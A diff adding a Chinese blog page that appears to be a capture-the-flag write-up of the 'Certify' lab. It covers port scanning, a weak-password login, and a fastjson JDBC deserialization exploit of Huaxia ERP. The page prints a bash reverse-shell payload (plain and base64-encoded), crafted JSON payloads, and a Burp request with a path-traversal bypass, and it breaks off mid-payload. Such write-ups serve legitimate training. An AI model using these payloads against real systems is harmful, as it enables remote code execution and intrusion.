@@ -1,0 +1,897 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/chongqing.jpg">
+  <link rel="icon" href="/img/chongqing.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="sangnigege">
+  <meta name="keywords" content="一个做事不将就的人，阻止他的只有时间">
+  
+    <meta name="description" content="前言 本文所使用的工具可参考以下仓库： Awesome_Pentest_Tools: 一站式渗透测试与红队工具合集，旨在帮助渗透测试人员打造自己的工具链  靶标介绍： Exchange 是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有 4">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云境 Certify">
+<meta property="og:url" content="http://example.com/2026/test51/index.html">
+<meta property="og:site_name" content="重庆森林不在重庆">
+<meta property="og:description" content="前言 本文所使用的工具可参考以下仓库： Awesome_Pentest_Tools: 一站式渗透测试与红队工具合集，旨在帮助渗透测试人员打造自己的工具链  靶标介绍： Exchange 是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有 4">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152208124.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152208656.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152208549.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152208701.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152209949.png">
+<meta property="article:published_time" content="2026-04-15T10:16:15.716Z">
+<meta property="article:modified_time" content="2026-04-15T14:39:01.919Z">
+<meta property="article:author" content="sangnigege">
+<meta property="article:tag" content="春秋云镜">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152208124.png">
+  
+  
+  
+  <title>春秋云境 Certify - 重庆森林不在重庆</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","app_key":"rSHs3EnI9lT7nQwv5J7fcBnq","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>重庆森林不在重庆</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="春秋云境 Certify"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-15 18:16" pubdate>
+          2026年4月15日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          43 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">春秋云境 Certify</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
+<p>本文所使用的工具可参考以下仓库：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/sangnigege/Awesome_Pentest_Tools">Awesome_Pentest_Tools: 一站式渗透测试与红队工具合集，旨在帮助渗透测试人员打造自己的工具链</a></p>
+</blockquote>
+<p><em>靶标介绍：</em></p>
+<p>Exchange 是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有 4 个 Flag，分布于不同的靶机。 *注意：该靶场只有4个flag，如果提交完4个flag后仍未攻克成功，请关闭环境提交反馈。</p>
+<h1 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h1><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs inform7"># fscan 2.0.0<br>./fscan -h 39.98.109.189                          <br>┌──────────────────────────────────────────────┐<br>│    ___                              _        │<br>│   / _ \     ___  ___ _ __ __ _  ___| | __    │<br>│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │<br>│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │<br>│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │<br>└──────────────────────────────────────────────┘<br>      Fscan Version: 2.0.0<br><br><span class="hljs-comment">[2025-08-14 22:18:20]</span> <span class="hljs-comment">[INFO]</span> 暴力破解线程数: 1<br><span class="hljs-comment">[2025-08-14 22:18:20]</span> <span class="hljs-comment">[INFO]</span> 开始信息扫描<br><span class="hljs-comment">[2025-08-14 22:18:20]</span> <span class="hljs-comment">[INFO]</span> 最终有效主机数量: 1<br><span class="hljs-comment">[2025-08-14 22:18:20]</span> <span class="hljs-comment">[INFO]</span> 开始主机扫描<br><span class="hljs-comment">[2025-08-14 22:18:20]</span> <span class="hljs-comment">[INFO]</span> 有效端口数量: 233<br><span class="hljs-comment">[2025-08-14 22:18:20]</span> <span class="hljs-comment">[SUCCESS]</span> 端口开放 39.98.109.189:21<br><span class="hljs-comment">[2025-08-14 22:18:20]</span> <span class="hljs-comment">[SUCCESS]</span> 端口开放 39.98.109.189:22<br><span class="hljs-comment">[2025-08-14 22:18:20]</span> <span class="hljs-comment">[SUCCESS]</span> 端口开放 39.98.109.189:80<br><span class="hljs-comment">[2025-08-14 22:18:20]</span> <span class="hljs-comment">[SUCCESS]</span> 服务识别 39.98.109.189:22 =&gt; <span class="hljs-comment">[ssh]</span> 版本:7.2p2 Ubuntu 4ubuntu2.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:<span class="hljs-comment">[SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10.]</span><br><span class="hljs-comment">[2025-08-14 22:18:20]</span> <span class="hljs-comment">[SUCCESS]</span> 服务识别 39.98.109.189:21 =&gt; <br><span class="hljs-comment">[2025-08-14 22:18:23]</span> <span class="hljs-comment">[SUCCESS]</span> 端口开放 39.98.109.189:8000<br><span class="hljs-comment">[2025-08-14 22:18:26]</span> <span class="hljs-comment">[SUCCESS]</span> 服务识别 39.98.109.189:80 =&gt; <span class="hljs-comment">[http]</span> 版本:1.10.3 产品:nginx 系统:Linux 信息:Ubuntu<br><span class="hljs-comment">[2025-08-14 22:18:33]</span> <span class="hljs-comment">[SUCCESS]</span> 服务识别 39.98.109.189:8000 =&gt; <span class="hljs-comment">[http]</span><br><span class="hljs-comment">[2025-08-14 22:18:33]</span> <span class="hljs-comment">[INFO]</span> 存活端口数量: 4<br><span class="hljs-comment">[2025-08-14 22:18:33]</span> <span class="hljs-comment">[INFO]</span> 开始漏洞扫描<br><span class="hljs-comment">[2025-08-14 22:18:33]</span> <span class="hljs-comment">[INFO]</span> 加载的插件: ftp, ssh, webpoc, webtitle<br><span class="hljs-comment">[2025-08-14 22:18:33]</span> <span class="hljs-comment">[SUCCESS]</span> 网站标题 http://39.98.109.189       状态码:200 长度:19813  标题:lumia<br><span class="hljs-comment">[2025-08-14 22:18:33]</span> <span class="hljs-comment">[SUCCESS]</span> 网站标题 http://39.98.109.189:8000  状态码:302 长度:0      标题:无标题 重定向地址: http://39.98.109.189:8000/login.html<br><span class="hljs-comment">[2025-08-14 22:18:34]</span> <span class="hljs-comment">[SUCCESS]</span> 网站标题 http://39.98.109.189:8000/login.html 状态码:200 长度:5662   标题:Lumia ERP<br><span class="hljs-comment">[2025-08-14 22:20:57]</span> <span class="hljs-comment">[SUCCESS]</span> 扫描已完成: 6/6<br><br># fscan 1.8.4<br>./fscan -h 39.98.109.189                          <br><br>   ___                              _    <br>  / _ \     ___  ___ _ __ __ _  ___| | __ <br> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /<br>/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    <br>\____/     |___/\___|_|  \__,_|\___|_|\_\   <br>                     fscan version: 1.8.4<br>start infoscan<br>39.98.109.189:21 <span class="hljs-keyword">open</span><br>39.98.109.189:80 <span class="hljs-keyword">open</span><br>39.98.109.189:22 <span class="hljs-keyword">open</span><br>39.98.109.189:8000 <span class="hljs-keyword">open</span><br><span class="hljs-comment">[*]</span> alive ports len <span class="hljs-keyword">is</span>: 4<br>start vulscan<br><span class="hljs-comment">[*]</span> WebTitle http://39.98.109.189       code:200 len:19813  title:lumia<br><span class="hljs-comment">[*]</span> WebTitle http://39.98.109.189:8000  code:302 len:0      title:None 跳转url: http://39.98.109.189:8000/login.html<br><span class="hljs-comment">[*]</span> WebTitle http://39.98.109.189:8000/login.html code:200 len:5662   title:Lumia ERP<br>已完成 4/4<br><span class="hljs-comment">[*]</span> 扫描结束,耗时: 46.288732096s<br></code></pre></td></tr></table></figure>
+
+<p>80端口是一个介绍产品的网站，8000端口应该是网站的后台</p>
+<p>弱口令登录：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">admin</span>:<span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure>
+
+<p>也可以注册一个用户</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152208124.png" srcset="/img/loading.gif" lazyload alt="image-20250816015614162"></p>
+<p>成功进入后台，进去后右上角点了一下官方插件跳转到了华夏ERP，于是去找一下华夏ERP相关的洞</p>
+<p>华夏ERP v2.3存在一处fastjson反序列化漏洞，可以通过evil-mysql-server和ysoserial构造恶意mysql服务打jdbc：</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/347135.html">Java 代码审计之华夏 ERP CMS v2.3 - FreeBuf网络安全行业门户</a></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs llvm"># 在vps上运行<br>./evil-mysql-server -addr <span class="hljs-number">3306</span> -java java -ysoserial ysoserial-all.jar<br><br># payload<br>bash -i &gt;&amp; /dev/tcp/公网IP/<span class="hljs-number">54500</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br>YmFzaCAtaSA+JiAvZGV<span class="hljs-number">2</span>L<span class="hljs-number">3</span>RjcC<span class="hljs-number">80</span>Ny<span class="hljs-number">45</span>NC<span class="hljs-number">43</span>NC<span class="hljs-number">4</span>yMy<span class="hljs-number">81</span>NDUwMCAwPiYx<br>&#123;<br>	<span class="hljs-string">&quot;name&quot;</span>: &#123;<br>		<span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>		<span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span><span class="hljs-punctuation">,</span><br>		<span class="hljs-string">&quot;hostToConnectTo&quot;</span>: <span class="hljs-string">&quot;公网IP&quot;</span><span class="hljs-punctuation">,</span><br>		<span class="hljs-string">&quot;portToConnectTo&quot;</span>: <span class="hljs-number">3306</span><span class="hljs-punctuation">,</span><br>		<span class="hljs-string">&quot;info&quot;</span>: &#123;<br>			<span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;yso_CommonsCollections6_bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC43NC4yMy81NDUwMCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><span class="hljs-punctuation">,</span><br>			<span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;pass&quot;</span><span class="hljs-punctuation">,</span><br>			<span class="hljs-string">&quot;statementInterceptors&quot;</span>: <span class="hljs-string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span><span class="hljs-punctuation">,</span><br>			<span class="hljs-string">&quot;autoDeserialize&quot;</span>: <span class="hljs-string">&quot;true&quot;</span><span class="hljs-punctuation">,</span><br>			<span class="hljs-string">&quot;NUM_HOSTS&quot;</span>: <span class="hljs-string">&quot;1&quot;</span><br>		&#125;<br>	&#125;<br>&#125;<br># 或者<br>&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-string">&quot;hostToConnectTo&quot;</span>: <span class="hljs-string">&quot;公网IP&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-string">&quot;portToConnectTo&quot;</span>: <span class="hljs-number">3306</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-string">&quot;info&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;yso_CommonsCollections6_bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC43NC4yMy81NDUwMCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;pass&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;statementInterceptors&quot;</span>: <span class="hljs-string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;autoDeserialize&quot;</span>: <span class="hljs-string">&quot;true&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;NUM_HOSTS&quot;</span>: <span class="hljs-string">&quot;1&quot;</span><br>    &#125;<span class="hljs-punctuation">,</span><br>    <span class="hljs-string">&quot;databaseToConnectTo&quot;</span>: <span class="hljs-string">&quot;dbname&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;&quot;</span><br>&#125;<br><br># 可以用bp发包<br>GET /register.html/../user/list?search<span class="hljs-operator">=</span>&#123;<br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.AutoCloseable&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-string">&quot;hostToConnectTo&quot;</span>: <span class="hljs-string">&quot;公网IP&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-string">&quot;portToConnectTo&quot;</span>: <span class="hljs-number">3306</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-string">&quot;info&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;yso_CommonsCollections6_bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45NC43NC4yMy81NDUwMCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;pass&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;statementInterceptors&quot;</span>: <span class="hljs-string">&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;autoDeserialize&quot;</span>: <span class="hljs-string">&quot;true&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-string">&quot;NUM_HOSTS&quot;</span>: <span class="hljs-string">&quot;1&quot;</span><br>    &#125;<span class="hljs-punctuation">,</span><br>    <span class="hljs-string">&quot;databaseToConnectTo&quot;</span>: <span class="hljs-string">&quot;dbname&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-string">&quot;url&quot;</span>: <span class="hljs-string">&quot;&quot;</span><br>&#125; HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">39.98</span>.<span class="hljs-number">109.189</span>:<span class="hljs-number">8000</span><br>Cache-Control: <span class="hljs-keyword">max</span>-age<span class="hljs-operator">=</span><span class="hljs-number">0</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span><span class="hljs-comment">; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36</span><br>Accept: text/html<span class="hljs-punctuation">,</span>application/xhtml+xml<span class="hljs-punctuation">,</span>application/xml<span class="hljs-comment">;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br>Accept-Encoding: gzip<span class="hljs-punctuation">,</span> deflate<br>Accept-Language: en<span class="hljs-punctuation">,</span>zh-TW<span class="hljs-comment">;q=0.9,zh;q=0.8,en-US;q=0.7</span><br>Cookie: JSESSIONID<span class="hljs-operator">=</span><span class="hljs-number">7</span>C<span class="hljs-number">6</span>C<span class="hljs-number">92</span>CE<span class="hljs-number">236</span>FFAEE<span class="hljs-number">4E7</span>FC<span class="hljs-number">06</span>FF<span class="hljs-number">8</span>EAF<span class="hljs-number">933</span><br>If-Modified-Since: Fri<span class="hljs-punctuation">,</span> <span class="hljs-number">29</span> Jul <span class="hljs-number">2022</span> <span class="hljs-number">07</span>:<span class="hljs-number">23</span>:<span class="hljs-number">14</span> GMT<br>Connection: close<br># 当然也可以直接get传payload，先登录，然后hackbar传参<br><span class="hljs-symbol">http:</span>//<span class="hljs-number">39.98</span>.<span class="hljs-number">109.189</span>:<span class="hljs-number">8000</span>/register.html/../user/list?search<span class="hljs-operator">=</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%22</span><span class="hljs-variable">%40</span><span class="hljs-variable">%74</span><span class="hljs-variable">%79</span><span class="hljs-variable">%70</span><span class="hljs-variable">%65</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%22</span><span class="hljs-variable">%6</span>a<span class="hljs-variable">%61</span><span class="hljs-variable">%76</span><span class="hljs-variable">%61</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%67</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%41</span><span class="hljs-variable">%75</span><span class="hljs-variable">%74</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%43</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%73</span><span class="hljs-variable">%65</span><span class="hljs-variable">%61</span><span class="hljs-variable">%62</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%65</span><span class="hljs-variable">%22</span><span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%0</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%20</span><span class="hljs-variable">%22</span><span class="hljs-variable">%40</span><span class="hljs-variable">%74</span><span class="hljs-variable">%79</span><span class="hljs-variable">%70</span><span class="hljs-variable">%65</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%20</span><span class="hljs-variable">%22</span><span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>d<span class="hljs-variable">%2</span>e<span class="hljs-variable">%6</span>d<span class="hljs-variable">%79</span><span class="hljs-variable">%73</span><span class="hljs-variable">%71</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%6</span>a<span class="hljs-variable">%64</span><span class="hljs-variable">%62</span><span class="hljs-variable">%63</span><span class="hljs-variable">%2</span>e<span class="hljs-variable">%4</span>a<span class="hljs-variable">%44</span><span class="hljs-variable">%42</span><span class="hljs-variable">%43</span><span class="hljs-variable">%34</span><span class="hljs-variable">%43</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span class="hljs-variable">%6</span>e<span class="hljs-variable">%65</span><span class="hljs-variable">%63</span><span class="hljs-variable">%74</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%6</span>e<span 